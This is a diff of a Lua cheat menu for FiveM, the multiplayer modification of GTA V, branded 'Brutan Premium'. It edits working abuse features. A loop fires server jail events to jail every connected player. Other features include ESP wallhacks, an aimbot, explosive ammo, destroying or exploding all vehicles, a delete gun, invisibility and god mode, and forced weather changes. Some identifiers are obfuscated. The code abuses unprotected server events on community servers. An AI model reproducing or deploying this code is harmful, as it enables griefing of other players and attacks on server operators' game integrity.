+                    '/ooc Brutan Premium BRUTAN ON YOUTUBE'
                 )
-                TriggerServerEvent('_chat:messageEntered', 'Brutan#3927', {0, 0x99, 255}, 'BRUTAN menu <3 https://discordapp.com/invite/tCEajtn')
+                TriggerServerEvent('_chat:messageEntered', '^8Brutan Premium', {0, 0x99, 255}, '^3 Brutan Premium BRUTAN ON YOUTUBE')
+				else
+				
             end
 	
 			if banallusers then
 				for i = 0, 128 do
 				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
 				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
-				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN BO$$ <3 Brutan#3927 https://discordapp.com/invite/tCEajtn")
-				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "BRUTAN<3 Brutan#3927 https://discordapp.com/invite/tCEajtn")
+				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~BRUTAN ON YOUTUBE")
+				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~BRUTAN ON YOUTUBE")
 					end
 				end
 
@@ -3554,14 +4534,9 @@ Citizen.CreateThread(
 			end
 			
             if invisible then
-		        local noclip_speed = 1.0
-        local ped = GetPlayerPed(-1)
-        local x,y,z = getPosition()
-        local dx,dy,dz = getCamDirection()
-        local speed = noclip_speed
-		SetEntityVisible(GetPlayerPed(-1), false, false)
-		SetEntityInvincible(GetPlayerPed(-1), true)
-		SetEntityVisible(ped, false);
+                SetEntityVisible(GetPlayerPed(-1), false, 0)
+            else
+                SetEntityVisible(GetPlayerPed(-1), true, 0)
             end
 			
 			
@@ -3579,7 +4554,7 @@ Citizen.CreateThread(
                 local cM = 0
                 for i = 0, 128 do
                     if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
-                        ped = GetPlayerPed(i)
+                        local ped = GetPlayerPed(i)
                         blip = GetBlipFromEntity(ped)
                         x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                         x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
@@ -3740,7 +4715,6 @@ Citizen.CreateThread(
 		SetEntityInvincible(GetPlayerPed(-1), true)
 		SetEntityVisible(ped, false);
 
-      -- reset velocity
       SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
       if IsControlPressed(0, 21) then
           speed = speed + 3
@@ -3748,15 +4722,14 @@ Citizen.CreateThread(
       if IsControlPressed(0, 19) then
           speed = speed - 0.5
       end
-      -- forward
-             if IsControlPressed(0,32) then -- MOVE UP
+             if IsControlPressed(0,32) then
               x = x+speed*dx
               y = y+speed*dy
               z = z+speed*dz
                end
 
-      -- backward
-               if IsControlPressed(0,269) then -- MOVE DOWN
+
+               if IsControlPressed(0,269) then
               x = x-speed*dx
               y = y-speed*dy
               z = z-speed*dz
@@ -3768,10 +4741,10 @@ Citizen.CreateThread(
 
          end
 
-            if DeleteGun then
+            if WADOHWIB then
                 local gotEntity = getEntity(PlayerId())
                 if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
-                    drawNotification("Aim The Gun At An Entity And Shoot!")
+                    drawNotification("Aim Your Gun At An Entity And Shoot!")
                     GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                     SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                     if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
@@ -3783,27 +4756,35 @@ Citizen.CreateThread(
                                         DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                         SetEntityAsMissionEntity(gotEntity, 1, 1)
                                         DeleteEntity(gotEntity)
-                                        drawNotification("~g~Deleted!")
+                                        drawNotification("~r~FUCKED")
                                     end
                                 else
                                     if IsControlJustReleased(1, 142) then
                                         SetEntityAsMissionEntity(gotEntity, 1, 1)
                                         DeleteEntity(gotEntity)
-                                        drawNotification("~g~Deleted!")
+                                        drawNotification("~r~FUCKED")
                                     end
                                 end
                             else
                                 if IsControlJustReleased(1, 142) then
                                     SetEntityAsMissionEntity(gotEntity, 1, 1)
                                     DeleteEntity(gotEntity)
-                                    drawNotification("~g~Deleted!")
+                                    drawNotification("~r~FUCKED!")
                                 end
                             end
                         end
                     end
                 end
             end
-			
+			if destroyvehicles then
+                for vehicle in EnumerateVehicles() do
+                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
+                        NetworkRequestControlOfEntity(vehicle)
+                        SetVehicleUndriveable(vehicle, true)
+                        SetVehicleEngineHealth(vehicle, 0)
+                    end
+                end
+            end
 			if explodevehicles then
 				for vehicle in EnumerateVehicles() do
 					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
@@ -3814,202 +4795,207 @@ Citizen.CreateThread(
 			end
 			
             if esp then
-                for i = 0, 64 do
-                    if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
-                        local ra = RGBRainbow(1.0)
-                        local pPed = GetPlayerPed(i)
-                        local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
-                        local x, y, z = table.unpack(GetEntityCoords(pPed))
-                        local message =
-                            "~h~Name: " ..
+                for i = 0, 128 do
+                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
+                        local a8 = k(1.0)
+                        local d7 = GetPlayerPed(i)
+                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
+                        local x, y, z = table.unpack(GetEntityCoords(d7))
+                        local db =
+                            '~h~Name: ' ..
                             GetPlayerName(i) ..
-                                "\nServer ID: " ..
+                                '\nServer ID: ' ..
                                     GetPlayerServerId(i) ..
-                                        "\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
-                        if IsPedInAnyVehicle(pPed, true) then
-                            local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
-                            message = message .. "\nVeh: " .. VehName
+                                        '\nPlayer ID: ' ..
+                                            i ..
+                                                '\nDist: ' ..
+                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
+                        if IsPedInAnyVehicle(d7, true) then
+                            local dc =
+                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
+                            db = db .. '\nVeh: ' .. dc
                         end
-                        DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)
-
-                        LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
-                        LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
-                        LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
-                        LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
-                        LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
-                        LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
-                        LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
-
-                        TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
-                        TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
-                        TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
-                        TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
-                        TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
-                        TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
-                        TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
-
-                        ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
-                        ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
-                        ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
-                        ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
-                        ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
-                        ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
-                        ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
-                        ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
-
-                        DrawLine(
-                            LineOneBegin.x,
-                            LineOneBegin.y,
-                            LineOneBegin.z,
-                            LineOneEnd.x,
-                            LineOneEnd.y,
-                            LineOneEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            LineTwoBegin.x,
-                            LineTwoBegin.y,
-                            LineTwoBegin.z,
-                            LineTwoEnd.x,
-                            LineTwoEnd.y,
-                            LineTwoEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            LineThreeBegin.x,
-                            LineThreeBegin.y,
-                            LineThreeBegin.z,
-                            LineThreeEnd.x,
-                            LineThreeEnd.y,
-                            LineThreeEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            LineThreeEnd.x,
-                            LineThreeEnd.y,
-                            LineThreeEnd.z,
-                            LineFourBegin.x,
-                            LineFourBegin.y,
-                            LineFourBegin.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            TLineOneBegin.x,
-                            TLineOneBegin.y,
-                            TLineOneBegin.z,
-                            TLineOneEnd.x,
-                            TLineOneEnd.y,
-                            TLineOneEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            TLineTwoBegin.x,
-                            TLineTwoBegin.y,
-                            TLineTwoBegin.z,
-                            TLineTwoEnd.x,
-                            TLineTwoEnd.y,
-                            TLineTwoEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            TLineThreeBegin.x,
-                            TLineThreeBegin.y,
-                            TLineThreeBegin.z,
-                            TLineThreeEnd.x,
-                            TLineThreeEnd.y,
-                            TLineThreeEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            TLineThreeEnd.x,
-                            TLineThreeEnd.y,
-                            TLineThreeEnd.z,
-                            TLineFourBegin.x,
-                            TLineFourBegin.y,
-                            TLineFourBegin.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            ConnectorOneBegin.x,
-                            ConnectorOneBegin.y,
-                            ConnectorOneBegin.z,
-                            ConnectorOneEnd.x,
-                            ConnectorOneEnd.y,
-                            ConnectorOneEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            ConnectorTwoBegin.x,
-                            ConnectorTwoBegin.y,
-                            ConnectorTwoBegin.z,
-                            ConnectorTwoEnd.x,
-                            ConnectorTwoEnd.y,
-                            ConnectorTwoEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            ConnectorThreeBegin.x,
-                            ConnectorThreeBegin.y,
-                            ConnectorThreeBegin.z,
-                            ConnectorThreeEnd.x,
-                            ConnectorThreeEnd.y,
-                            ConnectorThreeEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-                        DrawLine(
-                            ConnectorFourBegin.x,
-                            ConnectorFourBegin.y,
-                            ConnectorFourBegin.z,
-                            ConnectorFourEnd.x,
-                            ConnectorFourEnd.y,
-                            ConnectorFourEnd.z,
-                            ra.r,
-                            ra.g,
-                            ra.b,
-                            255
-                        )
-
-                        DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
+                        if KDOWJDw and esp then
+                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
+                        end
+                        if jfjfjffuhguh and esp then
+                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
+                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
+                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
+                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
+                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
+                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
+                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
+                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
+                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
+                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
+                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
+                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
+                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
+                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
+                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
+                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
+                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
+                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
+                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
+                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
+                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
+                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
+                            DrawLine(
+                                LineOneBegin.x,
+                                LineOneBegin.y,
+                                LineOneBegin.z,
+                                LineOneEnd.x,
+                                LineOneEnd.y,
+                                LineOneEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                LineTwoBegin.x,
+                                LineTwoBegin.y,
+                                LineTwoBegin.z,
+                                LineTwoEnd.x,
+                                LineTwoEnd.y,
+                                LineTwoEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                LineThreeBegin.x,
+                                LineThreeBegin.y,
+                                LineThreeBegin.z,
+                                LineThreeEnd.x,
+                                LineThreeEnd.y,
+                                LineThreeEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                LineThreeEnd.x,
+                                LineThreeEnd.y,
+                                LineThreeEnd.z,
+                                LineFourBegin.x,
+                                LineFourBegin.y,
+                                LineFourBegin.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineOneBegin.x,
+                                TLineOneBegin.y,
+                                TLineOneBegin.z,
+                                TLineOneEnd.x,
+                                TLineOneEnd.y,
+                                TLineOneEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineTwoBegin.x,
+                                TLineTwoBegin.y,
+                                TLineTwoBegin.z,
+                                TLineTwoEnd.x,
+                                TLineTwoEnd.y,
+                                TLineTwoEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineThreeBegin.x,
+                                TLineThreeBegin.y,
+                                TLineThreeBegin.z,
+                                TLineThreeEnd.x,
+                                TLineThreeEnd.y,
+                                TLineThreeEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineThreeEnd.x,
+                                TLineThreeEnd.y,
+                                TLineThreeEnd.z,
+                                TLineFourBegin.x,
+                                TLineFourBegin.y,
+                                TLineFourBegin.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorOneBegin.x,
+                                ConnectorOneBegin.y,
+                                ConnectorOneBegin.z,
+                                ConnectorOneEnd.x,
+                                ConnectorOneEnd.y,
+                                ConnectorOneEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorTwoBegin.x,
+                                ConnectorTwoBegin.y,
+                                ConnectorTwoBegin.z,
+                                ConnectorTwoEnd.x,
+                                ConnectorTwoEnd.y,
+                                ConnectorTwoEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorThreeBegin.x,
+                                ConnectorThreeBegin.y,
+                                ConnectorThreeBegin.z,
+                                ConnectorThreeEnd.x,
+                                ConnectorThreeEnd.y,
+                                ConnectorThreeEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorFourBegin.x,
+                                ConnectorFourBegin.y,
+                                ConnectorFourBegin.z,
+                                ConnectorFourEnd.x,
+                                ConnectorFourEnd.y,
+                                ConnectorFourEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                        end
+                        if jfjfjf and esp then
+                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
+                        end
                     end
                 end
             end
 
-			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
-				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
-			end
+            if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
+                    SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
+                end
 
             if rainbowTint then
                 for i = 0, #allWeapons do
@@ -4020,13 +5006,16 @@ Citizen.CreateThread(
             end
 
             if showCoords then
-                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
+                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                 roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
-                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl))
+                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl))
                 roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
+				local playerPedsss = PlayerPedId()
+				roundzxx = GetEntityHeading(playerPedsss)
                 bf("~r~X:~s~ "..roundx,0.05,0.00)
                 bf("~r~Y:~s~ "..roundy,0.11,0.00)
                 bf("~r~Z:~s~ "..roundz,0.17,0.00)
+				bf("~r~H:~s~ "..roundzxx,0.23,0.00)
             end
 
             if bulletGun then
@@ -4127,20 +5116,175 @@ Citizen.CreateThread(
                 end
             end
 
-            if explosiveAmmo then
+					if IsControlPressed(0, 323) and DoesEntityExist(Deer.Handle) then
+		Deer.Destroy()
+		end
+			
+            if bifegfubffff then
                 local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                 if impact then
                     AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                 end
             end
+			
+			 if rainbow then
+                    local color = k(1.0)
+                    for i = 0, #allMenus do
+                        BrutanPremium.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
+                    end  
+                    for i, dA in pairs(bd) do                 
+                        BrutanPremium.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
+                    end
+                    for i, dA in pairs(be) do 
+                        BrutanPremium.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
+                    end
+                end
+                
+                if animated then                                   
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
+                                
+                            end      
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
+                                
+                            end       
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
+                                
+                            end       
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
+                                
+                            end                          
+                end
+			
+			if explosiveAmmo then
+                local impact1, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
+                if impact1 then
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(200)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(200)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(150)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(150)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                end
+            end
 
 			if RainbowVeh then
-                local dq = k(1.0)
-                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
-                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
+                local u48y34 = k(1.0)
+                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
             end
 			
-            if aimbot then
+			if ou328hSync then
+                local u48y34 = k(1.0)
+				local ped = PlayerPedId()
+                local veh = GetVehiclePedIsUsing(ped)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 1, true)
+                SetVehicleNeonLightEnabled(veh, 2, true)
+                SetVehicleNeonLightEnabled(veh, 3, true)
+				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+			
+			if ou328hNeon then
+                local u48y34 = k(1.0)
+		    local ped = PlayerPedId()
+            local veh = GetVehiclePedIsUsing(ped)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 1, true)
+                SetVehicleNeonLightEnabled(veh, 2, true)
+                SetVehicleNeonLightEnabled(veh, 3, true)
+                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+			if LOJWDNDDNDN then
+                local u48y34 = k(1.0)
+		    local ped = PlayerPedId()
+            local veh = GetVehiclePedIsUsing(ped)
+               SetVehicleDirtLevel(veh, 1.0)
+				else
+            end
+			
+			if CLEAR then
+								SetWeatherTypePersist("CLEAR")
+        SetWeatherTypeNowPersist("CLEAR")
+        SetWeatherTypeNow("CLEAR")
+        SetOverrideWeather("CLEAR")
+		end
+		
+					if BLIZZARD then
+								SetWeatherTypePersist("BLIZZARD")
+        SetWeatherTypeNowPersist("BLIZZARD")
+        SetWeatherTypeNow("BLIZZARD")
+        SetOverrideWeather("BLIZZARD")
+		end
+		
+					if FOGGY then
+								SetWeatherTypePersist("FOGGY")
+        SetWeatherTypeNowPersist("FOGGY")
+        SetWeatherTypeNow("FOGGY")
+        SetOverrideWeather("FOGGY")
+		end
+		
+					if EXTRASUNNY then
+								SetWeatherTypePersist("EXTRASUNNY")
+        SetWeatherTypeNowPersist("EXTRASUNNY")
+        SetWeatherTypeNow("EXTRASUNNY")
+        SetOverrideWeather("EXTRASUNNY")
+		end
+			
+			if XMAS then
+			            SetForceVehicleTrails(true)
+            SetForcePedFootstepsTracks(true)
+					SetWeatherTypePersist("XMAS")
+        SetWeatherTypeNowPersist("XMAS")
+        SetWeatherTypeNow("XMAS")
+        SetOverrideWeather("XMAS")
+		end
+			
+            if LOJ38 then
                 for i = 0, 128 do
                     if i ~= PlayerId() then
                         if IsPlayerFreeAiming(PlayerId()) then
@@ -4162,6 +5306,31 @@ Citizen.CreateThread(
                     end
                 end
             end
+			
+			if IsControlJustReleased(0, Keys['X']) then
+			ClearPedTasks(PlayerPedId())
+		end
+			
+						if Nigubdddddd then 
+			local veh = GetVehiclePedIsUsing(PlayerPedId(-1))
+			if IsControlPressed(0, 232) then
+			SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
+			end
+				if veh ~= nil then
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
+					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 36.0)
+					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 60.0);
+				end
+			end
 
 			            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                 if IsControlPressed(0, 209) then
@@ -4181,10 +5350,10 @@ Citizen.CreateThread(
             end
 
             if fastrun then
-                SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
+                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
                 SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
             else
-                SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
+                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
                 SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
             end
 			
@@ -4208,6 +5377,21 @@ Citizen.CreateThread(
 			SetEntityCanBeDamaged(GetPlayerPed(-1), true)
 		end
 
+		if discordPresence then
+                    SetDiscordAppId(628637344098025482)
+            
